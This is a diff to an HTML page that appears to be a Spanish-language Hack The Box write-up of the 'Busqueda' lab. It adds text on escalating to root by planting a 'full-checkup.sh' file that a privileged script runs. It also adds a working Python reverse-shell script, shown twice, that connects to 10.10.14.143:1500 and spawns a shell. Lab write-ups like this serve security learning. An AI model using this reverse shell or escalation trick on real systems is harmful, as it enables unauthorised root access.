@@ -368,14 +368,36 @@ Something went wrong
 Al llamarlo desde nuestro directorio home el script intentaba encontrar el archivo "full-checkup.sh" y al no hacerlo saltaba el "Something went wrong".</p>
 <a href="/htb/busqueda/9.png" target="_blank"><div><p><img src="/htb/busqueda/9.png"></p></div></a>
 
-<p class="plain-text"></p>
-
+<p class="plain-text">Si creamos un archivo con el nombre "full-checkup.sh" dentro de nuestro directorio con código para crear una reverse shell de root, este debería de poder ejecutarse y darnosla. </p>
 
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<span class="ve"></span>
+<code><span class="ve">svc@busqueda:~$ cat full-checkup.sh</span>
+#!/usr/bin/python3
+import socket
+import subprocess
+import os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.143",1500))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("sh")
 </code></pre></div></div><br>
 
+svc@busqueda:~$ cat full-checkup.sh
+#!/usr/bin/python3
+import socket
+import subprocess
+import os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.143",1500))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("sh")
 
 
 </section>
